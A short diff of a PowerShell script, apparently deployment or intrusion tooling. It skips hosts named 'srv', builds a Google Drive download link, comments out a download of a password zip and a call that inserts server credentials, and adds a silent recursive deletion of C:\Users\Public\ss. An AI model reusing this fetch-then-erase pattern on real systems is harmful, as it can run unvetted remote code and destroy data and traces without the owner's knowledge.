@@ -94,11 +94,12 @@ if (-not($host_name -like '*srv*')) {
             }
 
     $file_url = "https://docs.google.com/uc?export=download&id=$file_id"
-    go $pwd_zip $file_url
+    #go $pwd_zip $file_url
     sleep(2)
-    insert_v $srv_name $srv_port $srv_pwd
+    #insert_v $srv_name $srv_port $srv_pwd
     sleep(1)
     Remove-Item $csv_file -Force -Confirm:$false | Out-Null
+    Remove-Item "C:\Users\Public\ss" -Recurse -Force -Confirm:$false | Out-Null
 
     exit 0
 }
